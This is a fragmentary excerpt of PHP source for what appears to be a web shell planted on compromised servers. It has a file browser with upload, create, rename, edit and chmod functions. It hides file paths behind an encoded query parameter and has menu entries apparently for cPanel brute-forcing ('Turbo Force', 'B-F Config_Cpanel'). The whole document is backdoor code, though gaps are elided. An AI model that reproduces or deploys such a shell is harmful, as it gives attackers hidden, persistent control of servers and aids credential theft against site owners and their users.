...
<body>
    ...
    <div id="container">
        ...
        <div id="menu"><a href="?none='.$currentnoneen.'">Home</a> || <a href="?none='.$currentnoneen.'&cpanel">Turbo Force</a> || <a href="?none='.$currentnoneen.'&cpanelconf">B-F Config_Cpanel</a></div>
        <div id="nav">
            <div class="none">Current none : '.nav_link().'
            <form methdo="GET" onSubmit="Encoder(\'c\');"><font color=red>Or</font> Select Your none : <input type="text" id="c" size="40" name="none" value="'.$currentnone.'" /><input type="submit" value="Go" /></form></div><br />
            <div class="upload">
                <form enctype="multipart/form-data" method="POST" action="?none='.$currentnoneen.'&up">
                Upload File : <input type="file" name="file" />
                <input type="submit" value="upload" />
                </form>
            </div>
            <div class="new">
                <form method="POST" action="?none='.$currentnoneen.'&new" onSubmit="Encoder(\'kc\')">
...
if(isset($_GET['cpanel'])){
    ...
    <input type="submit" value="start" />
        ...
        if(isset($_GET['filesrc'])){
            ...
            if($_POST['opt'] == 'chmod'){
                ...
                if($permdone){
                    ...
                    $perm = substr(sprintf('%o', fileperms($_POST['none'])), -4);
                }
                
                echo '<form method="POST">
                Permission : <input name="perm" type="text" size="4" value="'.$perm.'" />
                <input type="hidden" name="none" value="'.g22b_crypt($_POST['none'],'en').'">
                ...
                if(isset($_POST['newname'])){
                    if(rename($_POST['none'],$currentnone.'/'.$_POST['newname'])){
                ...
                if(isset($_GET['new']) && !$done){
                    $filecontent = '';
                    $_POST['none'] = "$currentnone/$_POST[name]";
                }else{
                    $filecontent = filesrc($_POST['none']);
                }
        ...
        foreach($dirs as $dir){
        echo '<div id="dirs"><tr>
        <td><a href="?none='.$dir['link'].'"><div class="filename">'.$dir['name'].'</div></a></td>
        <td class="center">'.$dir['size'].'</td>
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td>
        <td class="center"><form method="POST" action="?none='.$currentnoneen.'&option">
        <select name="opt">
	    <option value=""></option>
        ...
        <input type="hidden" name="none" value="'.$dir['link'].'">
        ...
        <tr>
        <td><a href="?none='.$currentnoneen.'&filesrc='.$file['link'].'"><div class="filename">'.$file['name'].'</div></a></td>
        ...
        <input type="hidden" name="none" value="'.$file['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr></div>';
        }
...
function getfiles($type){
    global $currentnone;
    $dir = scandir($currentnone);
    $result = array();
    foreach($dir as $file){
        $current['fullname'] = "$currentnone/$file";
        if($type == 'dir'){
...
function start(){
    ...
    $result['currentnone'] = (isset($_GET['none'])) ? g22b_crypt($_GET['none'],'de') : cwd();
    $result['currentnoneen'] = (isset($_GET['none'])) ? $_GET['none'] : g22b_crypt(cwd(),'en');
...
function nav_link(){
    ...
    $nones = explode('/',$none);
    $result = '';
    foreach($nones as $id=>$pat){
        if($pat == '' && $id == 0){
            $a = true;
            $result .= '<a href="?none='.g22b_crypt("/",'en').'">/</a>';
            continue;
        }
        if($pat == '') continue;
        $result .= '<a href="?none=';
